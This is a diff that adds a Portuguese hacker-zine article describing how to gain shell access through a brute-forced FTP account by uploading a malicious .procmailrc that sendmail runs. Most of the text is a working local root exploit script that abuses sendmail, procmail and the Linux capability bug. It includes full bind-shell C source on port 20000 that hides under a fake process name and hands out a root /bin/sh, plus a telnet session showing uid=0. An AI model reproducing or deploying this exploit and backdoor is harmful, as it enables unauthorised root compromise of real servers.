@@ -1,0 +1,235 @@
+
+############################################################################
+############################ UNSEKURITY SCENE ##############################
+############################################################################
+
+
+By Martin Fallon.
+mar_fallon@yahoo.com.br
+
+                        ** ACESSANDO UMA SHELL **
+                             (Via Sendmail)
+
+O Nash descreveu um modo de obter acesso shell via FTP + PHP.No entanto,
+este nao eh o unico modo conhecido.Existem diversos outros meios de se
+obter acesso shell, mesmo que voce obtenha uma conta "/bin/false".
+
+Como foi dito no artigo "PHP + FTP = SHELL", muitos provedores liberam
+acesso a FTP para que os usuarios possam atualizar as suas home pages!
+No entanto, nos, fucadores eticos newbies, podemos contemplar alguns
+esquemas a serem feitos em cima disso! Se a rede possuir PHP mal
+configurado, otimo!!! Basta usar a tecnica descrita pelo Nash, mas e se
+a rede possuir PHP, mas as configuracoes do servidor WEB impedirem a
+execucao em qualquer diretorio? Pior ainda, e se a rede alvo nao possuir
+PHP?
+
+Calma, amigos!! Existem dezenas de esquemas de se conseguir executar
+comandos shell e um deles serah descrito neste humilde artigo!
+Nenhuma das tecnicas que irei descrever eh nova! Mas por incrivel que
+pareca, muitos administradores de rede, esquecem desses problemas ou
+desconhecem por completo! 
+
+Espero que este texto seja util a voces e que possa desmistificar alguns
+aspectos referente ao hacking!
+
+-------------------------
+* FTP + SENDMAIL = SHELL |
+-------------------------
+
+O Sendmail eh um velho conhecido de todos que mexem com hacking! Ele eh
+um daemon para e-mails que possui alguns milhares de linhas de codigo!
+Quanto maior e mais complexo o programa, mais chances ele tem de
+apresentar bugs! Acredito que existe uma condicao muito forte dele sempre
+apresentar bugs! Apesar dos bugs, ele eh um programa interessante e que
+dispoem de infindaveis recursos! Muitos programas interagem com o sendmail
+filtrando conteudo, personalizando alguns aspectos de administracao e etc!
+Um desses programas eh o procmail! O procmail tambem eh um programa complexo
+e que tende a apresentar inumeras falhas! O esquema que veremos afeta
+o sendmail diretamente, mas o exploit que serah publicado para obtencao
+de root afeta o sendmail+procmail! 
+
+Mas voltando a questao da shell via ftp.Supondo que apos 2 dias de
+tentativas de brutal force, voce consiga acesso a uma conta valida de
+FTP.Voce tenta executar o esquema do PHP, mas sem sucesso! De repente
+voce percebe que esta eh uma conta nao soh de FTP, mas de e-mail tambem
+e que voce tem acesso ao diretorio HOME do usuario.Voce dah entao um
+telnet para a porta 25 do servidor alvo e ve algo parecido com a linha
+abaixo:
+
+220 darkstar ESMTP Sendmail 8.9.3/8.9.3; Thu, 28 Dec 2000 13:59:49 -0300
+
+Ao que tudo indica temos um sendmail 8.9.3!! Estamos com acesso FTP,
+entao tudo que devemos fazer eh criar um arquivo .procmailrc parecido com
+o que vemos abaixo:
+
+---------------------- .procmailrc ------------------------
+:H
+*
+|/bin/bash -c "/usr/bin/gcc -o hack hack.c; ./hack"
+-----------------------------------------------------------
+
+O que nos interessa eh a ultima linha, onde vemos que serah executada uma
+shell, depois nossos comandos(gcc -o hack hack.c; ./hack", advinha o
+que tem dentro do hack.c??? Exatamente!! Uma bindshell para uma porta
+alta que nos darah acesso shell a maquina alvo!! Mas para que o sendmail
+execute o que estamos desejando, precisamos enviar um e-mail para a
+conta onde se encontram os nossos arquivos .procmailrc e hack.c, mas
+isso qualquer um de nos sabe fazer!!:)
+
+Por incrivel que pareca, muitos sistemas tende a esquecer deste problema!
+Conta de FTP eh um passo significativo em busca de root!
+Mas as coisas nao param por aih.E se o sistema for um Linux com kernel
+menor que 2.2.16?? Voce nao soh pode obter acesso shell pelo exemplo
+acima, mas tambem obter uma bindshell suid root!!:).Como???
+
+Os passos abaixo nos ensinarao direitinho como proceder:
+
+1 - Envio de Shell script com comandos a serem executados(proc.sh);
+
+#!/bin/sh
+
+echo "+-----------------------------------------------------+"
+echo "|   Sendmail & procmail & kernel local root exploit   |"
+echo "|                                                     |"
+echo "|Bugs found and exploit written by Wojciech Purczynski|"
+echo "|    wp@elzabsoft.pl   cliph/ircnet  Vooyec/dalnet    |"
+echo "+-----------------------------------------------------+"
+echo "|             Alterado por Martin Fallon              |"
+echo "+-----------------------------------------------------+"
+
+cat <<_FOE_ > cap.c
+#define __KERNEL__
+#include <linux/capability.h>
+#undef __KERNEL__
+#include <linux/unistd.h>
+
+_syscall2(int, capset, cap_user_header_t, header, const cap_user_data_t, data)
+extern int capset(cap_user_header_t header, cap_user_data_t data);
+int main()
+{
+        struct __user_cap_header_struct caph={
+                _LINUX_CAPABILITY_VERSION,
+                0
+        };
+        struct __user_cap_data_struct capd={
+                0,
+                0,
+                0xfffffe7f
+        };
+        capset(&caph, &capd);
+        system("echo|/usr/sbin/sendmail alvo");
+/* Defina Acima o alvo como sendo o usuario que voce obteve acesso! */
+}
+_FOE_
+
+cat <<_FOE_ > $HOME/.procmailrc
+:H
+*
+|/bin/bash -c "chown root.root hack; chmod +s hack;./hack"
+
+_FOE_
+
+cat <<__FIM__ > hack.c
+/*
+ * Unknown author.
+ */
+
+#define PORT 20000
+#include <stdio.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
+struct sockaddr_in serv_addr;
+struct sockaddr_in client_addr;
+
+int main (int argc, char *argv[])
+{
+    int i;
+    for(i=0;i<argc;i++) {
+      memset(argv[i],'\x0',strlen(argv[i]));
+    };
+  strcpy(argv[0],"sendmail: OAA0850");
+
+    soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (soc_des == -1)
+        exit(-1);
+    bzero((char *) &serv_addr, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
+    serv_addr.sin_port = htons(PORT);
+    soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
+    if (soc_rc != 0)
+        exit(-1);
+    if (fork() != 0)
+        exit(0);
+    setpgrp();
+    signal(SIGHUP, SIG_IGN);
+    if (fork() != 0)
+        exit(0);
+    soc_rc = listen(soc_des, 5);
+    if (soc_rc != 0)
+        exit(0);
+    while (1) {
+        soc_len = sizeof(client_addr);
+        soc_cli = accept(soc_des, (struct sockaddr *) &client_addr,&soc_len);
+        if (soc_cli < 0)
+            exit(0);
+        cli_pid = getpid();
+        server_pid = fork();
+        if (server_pid != 0) {
+            dup2(soc_cli,0);
+            dup2(soc_cli,1);
+            dup2(soc_cli,2);
+            setuid(0);
+            setgid(0);
+            execl("/bin/sh","sh",(char *)0);
+            close(soc_cli);
+            exit(0);
+        }
+    close(soc_cli);
+    }
+}
+__FIM__
+
+/usr/bin/gcc cap.c -o cap
+/usr/bin/gcc -o hack hack.c
+./cap
+
+while [ ! -f ./hack ]; do
+sleep 1
+done
+
+2 - Criacao e envio do seguinte .procmailrc:
+
+:H
+*
+|/bin/bash -c "./proc.sh"
+
+3 - Simples envio de um e-mail para o usuario alvo.
+
+4 - Telnet porta 20000 do host alvo:
+
+darkstar:~$ telnet localhost 20000
+Trying 127.0.0.1...
+Connected to localhost.
+Escape character is '^]'.
+id;
+uid=0(root) gid=0(root) groups=100(users)
+: command not found
+
+Como vimos este esquema eh pratico e funcional! Em alguns casos ateh uma
+root shell pode estar a nossa espera se formos atenciosos! Podemos usar
+esta tecnica para obtermos shell em sistemas com Samba, NFS, FTP, etc
+etc e etc!!:)
+
+
+Existem outros esquemas para se obter shell via FTP + Alguma Configuracao.
+Em breve publicarei outro artigo expondo outra tecnica.
+
+Um [].
+
+Martin Fallon.
+
